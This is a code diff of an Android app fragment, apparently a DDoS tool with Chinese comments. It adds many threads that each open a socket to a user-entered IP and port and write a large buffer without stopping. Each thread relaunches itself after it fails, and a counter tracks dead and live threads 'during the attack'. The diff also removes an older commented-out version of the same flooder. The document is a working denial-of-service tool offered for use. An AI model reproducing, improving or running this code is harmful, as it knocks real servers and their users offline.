@@ -5,12 +5,14 @@ import android.annotation.SuppressLint;
 import android.app.AlertDialog;
 import android.app.ProgressDialog;
 import android.content.DialogInterface;
+import android.graphics.pdf.PdfDocument;
 import android.os.Bundle;
 import android.os.Handler;
 import android.os.Message;
 import android.support.annotation.Nullable;
 import android.support.design.widget.TextInputEditText;
 import android.support.v4.app.Fragment;
+import android.util.Log;
 import android.view.Gravity;
 import android.view.LayoutInflater;
 import android.view.View;
@@ -26,6 +28,7 @@ import java.net.Socket;
 import java.util.concurrent.Callable;
 import java.util.concurrent.ExecutionException;
 import java.util.concurrent.FutureTask;
+import java.util.logging.Logger;
 
 public class PageFragment extends Fragment {
 
@@ -34,16 +37,18 @@ public class PageFragment extends Fragment {
     public static String ip;//目标服务器的ip
     public static int port;//             端口
     public static long killNum=0;//当前死亡的线程数量，每一秒清空一次
-    public static long alive=0;//现在存活的线程
-    public static boolean isStart=false;//是否开始
+    public static int alive=0;//现在存活的线程
+    public static volatile boolean isStart=false;//是否开始,后面线程也根据这个变量判断是否停止
     public static int threadNum=0;//线程总数
     public static int bufferSize=0;//缓存大小
     public static boolean flag=false;//错误记号
     public static String Thread_info="";//多线程投递过来的信息
-
+    public static Object lock=new Object();//互斥锁
+    public static Handler uiHandler = new Handler();//跨线程调用的handler
+    public static Handler handler_thread=null;//统计线程的handler
     //组件部分
     AlertDialog Warningdialog;//警告的对话框，定义一个环保
-    ProgressDialog progress;
+    public static ProgressDialog progress;
 
     /*
     ProgressDialog pd;
@@ -81,6 +86,21 @@ public class PageFragment extends Fragment {
         }).create();
         //还有进度框
         progress= new ProgressDialog(getActivity());
+        progress.setTitle("正在处理");
+        progress.setProgressStyle(ProgressDialog.STYLE_HORIZONTAL);//设置对话进度条样式为水平
+        progress.getWindow().setGravity(Gravity.CENTER);//居中
+        progress.setCancelable(false);// 设置是否可以通过点击Back键取消
+        progress.setCanceledOnTouchOutside(false);// 设置在点击Dialog外是否取消Dialog进度条
+
+        //最后是我们的统计线程专用的handler
+        handler_thread=new Handler() {
+            public void handleMessage(Message msg) {
+                switch (msg.what) {
+                    case 0:
+                        ((TextView)getView().findViewById(R.id.threadInfo)).setText("死亡线程速度:"+killNum+"/s\n存活线程:"+alive+"\n");
+                }
+            }
+        };
 
         //下面开始绑定按钮事件，同时也是本软件的核心部分
         Button btn_start = (Button) getView().findViewById(R.id.btn_start);
@@ -94,7 +114,17 @@ public class PageFragment extends Fragment {
                     Warningdialog.show();
                     return;
                 }
-                isStart=false;//归位
+                //发起暂停命令前我们设置一下progress
+                progress.setMessage("正在回收线程");
+                progress.setMax(alive);
+                progress.setProgress(0);//归位
+                while(PageFragment.progress.getProgress()!=0){
+                    progress.setProgress(0);//归位
+                }
+                progress.show();
+                Log.println(Log.WARN,"progress","alive!"+PageFragment.alive+"progress!"+PageFragment.progress.getProgress());
+
+                isStart=false;//归位,全体线程立马关闭！！！！！
                 ((LinearLayout) getView().findViewById(R.id.infoLayout)).setVisibility(View.GONE);//隐藏回去
             }
         });
@@ -140,11 +170,6 @@ public class PageFragment extends Fragment {
                 }
 
                 //然后还没完，我们填充缓存，填充时有错误也是要报错的，我们开线程来进行
-                progress.setTitle("正在处理");
-                progress.setProgressStyle(ProgressDialog.STYLE_HORIZONTAL);//设置对话进度条样式为水平
-                progress.getWindow().setGravity(Gravity.CENTER);//居中
-                progress.setCancelable(false);// 设置是否可以通过点击Back键取消
-                progress.setCanceledOnTouchOutside(false);// 设置在点击Dialog外是否取消Dialog进度条
 
                 final Handler handler=new Handler(){
                     public void handleMessage(Message msg){
@@ -176,7 +201,7 @@ public class PageFragment extends Fragment {
                             case 4:
                                 //结束
                                 ((LinearLayout) getView().findViewById(R.id.infoLayout)).setVisibility(View.VISIBLE);//把隐藏部分显示出来
-                                isStart=true;
+                                progress.setProgress(0);
                                 return;
                         }
                     }
@@ -198,17 +223,23 @@ public class PageFragment extends Fragment {
                                 message.what = 2;
                                 handler.sendMessage(message);
                             }
+                            isStart=true;
                             Thread.sleep(500);
                             //填完就轮到我们的线程了
                             message = new Message();
                             message.what = 0;
                             handler.sendMessage(message);
                             for (int i = 0; i < threadNum; i++) {
-                                Thread.sleep(1000);
+                                //Thread.sleep(1000);
+                                Thread t=new thread_ddos();
+                                t.start();
                                 message = new Message();
                                 message.what = 2;
                                 handler.sendMessage(message);
                             }
+                            //最后统计线程
+                            Thread t=new thread_setNum();
+                            t.start();
                             message = new Message();
                             message.what = 4;
                             handler.sendMessage(message);
@@ -227,236 +258,6 @@ public class PageFragment extends Fragment {
                 //至此，这个按钮的使命结束
             }
         });
-
-
-        /*
-
-        //监听button事件
-        pd = new ProgressDialog(getActivity());
-        pd1 = new ProgressDialog(getActivity());
-
-        btn2.setOnClickListener(new View.OnClickListener() {
-            @Override
-            public void onClick(View v) {
-                if (!lock) {
-                    dialog.setTitle("警告");
-                    dialog.setMessage("当前没有在执行攻击");
-                    dialog.show();
-                    return;
-                }
-                pd1.setProgressStyle(ProgressDialog.STYLE_HORIZONTAL);// 设置水平进度条
-                pd1.setCancelable(false);// 设置是否可以通过点击Back键取消
-                pd1.setCanceledOnTouchOutside(false);// 设置在点击Dialog外是否取消Dialog进度条
-                //dialog.setIcon(R.drawable.ic_launcher);// 设置提示的title的图标，默认是没有的
-                pd1.setTitle("正在终止...");
-                pd1.setMax(threadPool.length);
-                pd1.setMessage("等待线程退出...");
-                pd1.show();
-                stop s = new stop(threadPool.length);
-                s.start();
-                lock = false;
-                stop = false;
-            }
-
-            class stop extends Thread {
-                int l = 0;
-
-                public stop(int l) {
-                    this.l = l;
-                }
-
-                @Override
-                public void run() {
-                    for (int i = 0; i < l; i++) {
-                        try {
-                            threadPool[i].s.close();
-                        } catch (Exception e) {
-                        }
-                        threadPool[i].interrupt();
-                        jd = i;
-                        Runnable runnable = new Runnable() {
-                            @Override
-                            public void run() {
-                                //pd1.setMessage(String.valueOf(jd));
-                                pd1.incrementProgressBy(jd);
-                            }
-                        };
-                        uiHandler.post(runnable);
-                    }
-                    Runnable runnable = new Runnable() {
-                        @Override
-                        public void run() {
-                            pd1.cancel();
-                            killN = 0;
-                            h = 0;
-                            jd = 0;
-                            ((LinearLayout) getView().findViewById(R.id.ll)).setVisibility(View.GONE);
-                        }
-                    };
-                    uiHandler.post(runnable);
-                }
-            }
-        });
-        btn1.setOnClickListener(new View.OnClickListener() {
-            @Override
-            public void onClick(View v) {
-                if (lock) {
-                    dialog.setTitle("警告");
-                    dialog.setMessage("当前攻击正在执行");
-                    dialog.show();
-                    return;
-                }
-                pd.setProgressStyle(ProgressDialog.STYLE_SPINNER);
-                pd.setCanceledOnTouchOutside(false);
-                pd.setMessage("初始化...");
-                pd.show();
-                lock = true;
-                LinearLayout ll;
-                EditText ip = null;
-                EditText thread = null;
-                EditText buff = null;
-                TextView kill;
-                boolean astop = false;
-                try {
-                    ll = (LinearLayout) getView().findViewById(R.id.ll);
-                    kill = (TextView) getView().findViewById(R.id.killThread);
-                    ip = (EditText) getView().findViewById(R.id.ip);
-                    buff = (EditText) getView().findViewById(R.id.buff);
-                    thread = (EditText) getView().findViewById(R.id.thread);
-                    kill.setText("正在攻击，线程死亡速度:0个/s\n存活线程:0");
-                } catch (Exception e) {
-                    pd.cancel();
-                    dialog.setTitle("错误");
-                    dialog.setMessage("初始化失败：" + e.getMessage());
-                    dialog.show();
-                    astop = true;
-                }
-                if (astop) {
-                    lock = false;
-                    return;
-                }
-                String[] temp = ip.getText().toString().split(":");
-                if (temp.length != 2) {
-                    pd.cancel();
-                    dialog.setTitle("错误");
-                    dialog.setMessage("ip格式错误");
-                    dialog.show();
-                    astop = true;
-                }
-                if (astop) {
-                    lock = false;
-                    return;
-                }
-                ipS = temp[0];
-                try {
-                    buffSize = Integer.parseInt(buff.getText().toString());
-                } catch (Exception e) {
-                    pd.cancel();
-                    dialog.setTitle("错误");
-                    dialog.setMessage("缓冲大小错误");
-                    dialog.show();
-                    astop = true;
-                }
-                if (astop) {
-                    lock = false;
-                    return;
-                }
-                port = Integer.parseInt(temp[1]);
-                tN = Integer.parseInt(thread.getText().toString());
-                Thread2 t = new Thread2();
-                t.start();
-            }
-
-            class Thread2 extends Thread {
-                @Override
-                public void run() {
-                    try {
-                        buffer = new byte[1024 * buffSize];
-                        for (int i = 0; i < 1024 * buffSize; i++) {
-                            buffer[i] = 127;
-                        }
-                    } catch (Exception e) {
-                        err = e.getMessage();
-                        Runnable runnable = new Runnable() {
-                            @Override
-                            public void run() {
-                                pd.cancel();
-                                dialog.setTitle("错误");
-                                dialog.setMessage("创建缓冲区时发生错误：" + err);
-                                dialog.show();
-                            }
-                        };
-                        uiHandler.post(runnable);
-                        return;
-                    }
-                    Runnable runnable = new Runnable() {
-                        @Override
-                        public void run() {
-                            pd.setMessage("正在释放线程...");
-                        }
-                    };
-                    uiHandler.post(runnable);
-                    try {
-                        threadPool = new Thread1[tN];
-                        for (int i = 0; i < tN; i++) {
-                            //Runnable thread1 = new Thread1();
-                            Thread1 thread2 = new Thread1();
-                            threadPool[i] = thread2;
-                            threadPool[i].start();
-                        }
-                    } catch (Exception e) {
-                        err = e.getMessage();
-                        Runnable runnable2 = new Runnable() {
-                            @Override
-                            public void run() {
-                                pd.cancel();
-                                dialog.setTitle("错误");
-                                dialog.setMessage("释放线程时发生错误：" + err);
-                                dialog.show();
-                            }
-                        };
-                        uiHandler.post(runnable2);
-                        return;
-                    }
-                    th t = new th();
-                    t.start();
-                    Runnable runnable1 = new Runnable() {
-                        @Override
-                        public void run() {
-                            pd.cancel();
-
-                        }
-                    };
-                    uiHandler.post(runnable1);
-                }
-            }
-
-            class th extends Thread {
-                @Override
-                public void run() {
-                    while (true) {
-                        if (!lock) {
-                            break;
-                        }
-                        try {
-                            Thread.sleep(1000);
-                        } catch (Exception e) {
-
-                        }
-                        Runnable runnable = new Runnable() {
-                            @Override
-                            public void run() {
-                                TextView kill = (TextView) getView().findViewById(R.id.killThread);
-                                kill.setText("正在攻击，线程死亡速度:" + killN + "个/s\n存活线程:" + h);
-                                killN = 0;
-                            }
-                        };
-                        uiHandler.post(runnable);
-                    }
-                }
-            }
-        });
-         */
     }
 
     @Nullable
@@ -471,21 +272,38 @@ public class PageFragment extends Fragment {
     }
 
 }
-class Thread1 extends Thread{
+class thread_ddos extends Thread{//ddos线程
     public Socket s=null;
     @Override
     public void run(){
+
+        //初始化数据流
         OutputStream os=null;
         DataOutputStream dos=null;
-        while(!isInterrupted()){
+        boolean isKill=false;//是否是错误导致的死亡
+        while(PageFragment.isStart){//根据isStart判断是否要停止
             try {
+                synchronized (PageFragment.lock){//同步
+                    if(!PageFragment.isStart){//如果停止后线程又获得锁了，那么就直接返回
+                        Log.println(Log.WARN,"return!!!!!","alive!"+PageFragment.alive);
+                        continue;
+                    }
+                    PageFragment.alive++;
+                    if(PageFragment.alive>PageFragment.threadNum){
+                        Log.println(Log.WARN,"thread","alive!"+PageFragment.alive);
+                    }
+                    //Log.println(Log.WARN,"thread","alive!"+PageFragment.alive);
+                    PageFragment.lock.notifyAll();
+                }
                 s=new Socket(PageFragment.ip,PageFragment.port);
-                PageFragment.alive++;
                 //流准备
                 //s.setSoTimeout(
                 os=s.getOutputStream();
                 dos=new DataOutputStream(os);
-                while(!isInterrupted()) {
+                Log.println(Log.WARN,"thread","had create");
+
+                while(PageFragment.isStart) {
+                    //Log.println(Log.WARN,"thread","had worked");
                     dos.write(PageFragment.buffer);
                     dos.flush();
                 }
@@ -493,10 +311,103 @@ class Thread1 extends Thread{
                 //PageFragment.kill.setText("正在攻击，当前已死亡线程:"+PageFragment.killN);
                 ///uiHandler.post(runnable1);
                 //System.out.println("线程死亡，重生！"+e.getMessage());
-                //Runnable thread1 = new Thread1(); 
+                //Runnable thread1 = new Thread1();
+                isKill=true;
+                e.printStackTrace();
+            }finally {
+                close(dos);
+                close(os);
+                close(s);
+
             }
-            PageFragment.killNum++;
-            PageFragment.alive--;
+
+            if (isKill) {
+                //重生操作
+                //如果停止命令已经发起，那么我们就不去重生
+                if(!PageFragment.isStart){
+                    Runnable runnable = new Runnable() {
+                        @Override
+                        public void run() {
+                            //pd1.setMessage(String.valueOf(jd));
+                            //给我们的progress刷新进度
+                            //synchronized (PageFragment.lock) {//同步
+                                PageFragment.progress.setProgress(PageFragment.progress.getProgress()+1);
+                                Log.println(Log.WARN,"thread","alive!"+PageFragment.alive+"progress!"+PageFragment.progress.getProgress());
+                                //最后一个线程擦屁股
+                                if(PageFragment.progress.getProgress()==PageFragment.alive){
+                                    PageFragment.progress.dismiss();
+                                    //Log.println(Log.WARN,"thread","alive!"+PageFragment.alive+"progress!"+PageFragment.progress.getProgress());
+                                    //PageFragment.lock.notifyAll();
+                                }
+                            //}
+                        }
+                    };
+                    PageFragment.uiHandler.post(runnable);
+                    return;
+                }
+                synchronized (PageFragment.lock) {//同步
+                    PageFragment.killNum++;
+                    PageFragment.alive--;
+                    PageFragment.lock.notifyAll();
+                }
+                //重生！！！
+                try {
+                    Thread.sleep(300);
+                } catch (InterruptedException e) {
+                    e.printStackTrace();
+                }
+                Thread t=new thread_ddos();
+                t.start();
+                return;
+            } else {
+                Runnable runnable = new Runnable() {
+                    @Override
+                    public void run() {
+                        //pd1.setMessage(String.valueOf(jd));
+                        //给我们的progress刷新进度
+                        //synchronized (PageFragment.lock) {//同步
+                            PageFragment.progress.setProgress(PageFragment.progress.getProgress()+1);
+                            //最后一个线程擦屁股
+                            Log.println(Log.WARN,"thread","alive!"+PageFragment.alive+"progress!"+PageFragment.progress.getProgress());
+                            if(PageFragment.progress.getProgress()==PageFragment.alive){
+                                PageFragment.progress.dismiss();
+                                //PageFragment.lock.notifyAll();
+                            }
+                        //}
+                    }
+                };
+                PageFragment.uiHandler.post(runnable);
+            }
+        }
+    }
+    public <T extends java.io.Closeable> void close(T t){
+        try{
+            if(t !=null){
+                t.close();
+            }
+        }catch(Exception e){
+            e.printStackTrace();
+        }
+    }
+}
+
+class thread_setNum extends Thread{
+
+    @Override
+    public void run(){
+        while(PageFragment.isStart){//循环，每1秒更新一次数据，更新后将死亡线程数归零（又是同步）
+            Message m=new Message();
+            m.what=0;
+            PageFragment.handler_thread.sendMessage(m);
+            synchronized (PageFragment.lock){
+                PageFragment.killNum=0;
+                PageFragment.lock.notifyAll();
+            }
+            try {
+                Thread.sleep(1000);
+            } catch (InterruptedException e) {
+                e.printStackTrace();
+            }
         }
     }
 }
